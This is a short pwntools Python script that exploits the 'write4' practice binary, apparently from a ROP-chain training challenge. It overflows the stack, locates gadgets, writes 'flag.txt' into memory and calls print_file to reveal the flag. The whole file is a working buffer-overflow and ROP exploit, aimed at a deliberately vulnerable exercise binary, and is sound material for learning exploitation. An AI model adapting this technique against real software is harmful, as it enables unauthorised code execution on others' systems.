from pwn import *

#
# Context
#

e = context.binary = ELF('write4')

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x200))
io.wait()
core = io.corefile
io.close()

offset = cyclic_find(core.read(core.rsp, 4))

info(f'Offset: {offset}')

#
# ROP
#

PRINT_FILE      = p64(e.plt['print_file'])

POP_RDI         = p64(next(e.search(asm('pop rdi; ret;'))))
POP_R14_R15     = p64(next(e.search(asm('pop r14; pop r15; ret;'))))
DEREF_R15_R14   = p64(next(e.search(asm('mov qword ptr [r14], r15; ret;'))))

BSS_WRITE       = p64(e.bss(offset=0x200))

#
# Exploit
#

io = process(e.path)

payload  = b''
payload += b'A' * offset

payload += POP_R14_R15
payload += BSS_WRITE
payload += b'flag.txt'
payload += DEREF_R15_R14
payload += POP_RDI
payload += BSS_WRITE
payload += PRINT_FILE

io.sendlineafter(b'> ', payload)

print(io.recvrepeat(1).decode())